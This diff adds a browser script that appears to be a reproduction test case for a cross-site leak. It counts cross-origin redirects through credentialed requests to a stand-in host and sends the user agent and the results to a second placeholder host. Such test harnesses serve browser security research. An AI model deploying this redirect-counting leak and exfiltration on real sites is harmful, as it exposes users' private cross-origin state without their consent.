@@ -1,0 +1,30 @@
+<script>
+    var results = [];
+    function run(url, nb_of_redirects, cb) {
+        fetch("https://attack.er/server_redirect_count/" + nb_of_redirects + "/0/?url=" + url, {
+            credentials: "include",
+            mode: "no-cors"
+        }).then(function () {
+            console.log(nb_of_redirects);
+            results.push(nb_of_redirects);
+            cb();
+        })["catch"](function () {
+            run(url, ++nb_of_redirects, cb);
+        });
+    }
+
+    function report() {
+        var xhr = new XMLHttpRequest();
+        xhr.open("GET", "https://re.port/case9.json/" + btoa(JSON.stringify({
+            "user-agent": navigator.userAgent,
+            "eight": results[0],
+            "sixteen": results[1],
+            "xsleak_reproduced": results[0] === 8 && results[1] === 16
+        })));
+        xhr.send();
+    }
+
+    run('https://leak.test/server_redirect/8/', 0, function () {
+        run('https://leak.test/server_redirect/16/', 0, report);
+    });
+</script>
